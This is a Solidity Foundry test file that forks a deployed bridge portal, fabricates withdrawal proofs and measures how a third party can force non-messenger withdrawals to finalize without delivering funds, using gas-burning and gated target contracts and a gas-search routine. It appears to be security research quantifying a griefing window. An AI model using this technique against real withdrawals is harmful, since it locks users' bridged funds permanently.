// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
import "./Base.sol";

contract Inf { fallback() external payable { while (true) {} } }
contract Wrap1 { // forwards to the burner at A2, bubbles failure
    fallback() external payable {
        (bool ok,) = 0x2e234DAe75C793f67A35089C9d99245E1C58470b.call{ value: msg.value }("");
        require(ok, "inner failed");
    }
}
contract WrapMid { // lives at 0x5B2, forwards to A2
    fallback() external payable {
        (bool ok,) = 0x2e234DAe75C793f67A35089C9d99245E1C58470b.call{ value: msg.value }("");
        require(ok, "inner failed");
    }
}
contract Wrap2 { // forwards to WrapMid at 0x5B2
    fallback() external payable {
        (bool ok,) = address(0x5B2).call{ value: msg.value }("");
        require(ok, "inner failed");
    }
}
contract Probe { uint256 public got; fallback() external payable { got = gasleft(); } }
contract Gate {
    bool public open;
    function set(bool o) external { open = o; }
    fallback() external payable { require(open, "closed"); }
}

/// FABRICATED proofs (vm.store on provenWithdrawals) against a real, honestly resolved game. Quantifies the
/// third-party forced-failure window of a NON-messenger withdrawal on the deployed portal v6.1.0.
contract QuantTest is Base {
    address game;
    address constant SUB = address(0x5B);
    address constant ATT = address(0xA77ACC);

    function setUp() public {
        _fork();
        Prove memory p = _load(8);
        game = _mature(p.hash, p.submitter);
    }
    function _fab(WithdrawalTransaction memory w) internal returns (bytes32 h) {
        h = hashWd(w);
        bytes32 slot = keccak256(abi.encode(SUB, keccak256(abi.encode(h, uint256(57)))));
        vm.store(address(PORTAL), slot, bytes32(((block.timestamp - 604810) << 160) | uint256(uint160(game))));
    }
    // NOTE: only (nonce, sender, target=A1, value, gasLimit) tuples whose storage slots the shared anvil has
    // already cached are used (upstream RPC is rate-limited); behaviours are swapped in with vm.etch on A1.
    address constant A1 = 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f; // first CREATE of the forge test contract
    function _w(uint256 value, uint256 gasLimit) internal pure returns (WithdrawalTransaction memory w) {
        w = WithdrawalTransaction({ nonce: (uint256(1) << 240) | 0xffffffffff, sender: address(0xBEEF), target: A1, value: value, gasLimit: gasLimit, data: "" });
    }
    function _fin(WithdrawalTransaction memory w, uint256 g) internal returns (bool ok) {
        vm.prank(ATT);
        (ok,) = address(PORTAL).call{ gas: g }(abi.encodeCall(IPortal.finalizeWithdrawalTransactionExternalProof, (w, SUB)));
    }
    function _minOk(WithdrawalTransaction memory w) internal returns (uint256 hi) {
        uint256 lo = 50_000; hi = 12_000_000;
        while (hi - lo > 1) {
            uint256 mid = (lo + hi) / 2;
            uint256 snap = vm.snapshotState();
            bool ok = _fin(w, mid);
            vm.revertToState(snap);
            if (ok) hi = mid; else lo = mid;
        }
    }
    function _case(string memory name, bytes memory code, uint256 value, uint256 gasLimit) internal {
        uint256 snap0 = vm.snapshotState();
        WithdrawalTransaction memory w = _w(value, gasLimit);
        bytes32 h = _fab(w);
        vm.etch(A1, code);
        uint256 g = _minOk(w);
        uint256 snap = vm.snapshotState();
        vm.etch(A1, vm.getDeployedCode("Quant.t.sol:Probe"));
        _fin(w, g);
        uint256 got = Probe(payable(A1)).got();
        vm.revertToState(snap);
        uint256 lb = LOCKBOX.balance; uint256 tb = A1.balance;
        assertTrue(_fin(w, g));
        assertTrue(PORTAL.finalizedWithdrawals(h));
        assertEq(LOCKBOX.balance, lb); assertEq(A1.balance, tb);
        console.log(name);
        console.log("   min outer gas for finalized-UNDELIVERED / target gas at entry:", g, got);
        vm.revertToState(snap0);
    }
    function test_forced_failure_thresholds() public {
        require(address(new Probe()) == A1, "A1"); // create A1 locally so its storage is local
        bytes memory inf = vm.getDeployedCode("Quant.t.sol:Inf");
        require(address(new Inf()) == 0x2e234DAe75C793f67A35089C9d99245E1C58470b, "A2");
        vm.etch(address(0x5B2), vm.getDeployedCode("Quant.t.sol:WrapMid"));
        _case("direct burner, value 1 ETH, gasLimit 0", inf, 1 ether, 0);
        _case("direct burner, value 0, gasLimit 100k", inf, 0, 100_000);
        _case("direct burner, value 1 ETH, gasLimit 100k", inf, 1 ether, 100_000);
        _case("wrapper(1 level)->burner, value 1 ETH, gasLimit 0", vm.getDeployedCode("Quant.t.sol:Wrap1"), 1 ether, 0);
        _case("wrapper(2 levels)->burner, value 1 ETH, gasLimit 0", vm.getDeployedCode("Quant.t.sol:Wrap2"), 1 ether, 0);
    }
    function test_state_dependent_target_thirdparty_timing() public {
        vm.etch(A1, address(new Gate()).code);
        Gate gt = Gate(payable(A1));
        WithdrawalTransaction memory w = _w(5 ether, 100_000);
        bytes32 h = _fab(w);
        uint256 lb = LOCKBOX.balance; uint256 tb = A1.balance;
        assertTrue(_fin(w, 3_000_000)); // third party picks a moment when the target rejects
        assertTrue(PORTAL.finalizedWithdrawals(h));
        assertEq(LOCKBOX.balance, lb); assertEq(A1.balance, tb);
        gt.set(true);
        assertFalse(_fin(w, 3_000_000)); // AlreadyFinalized: no replay path
    }
}
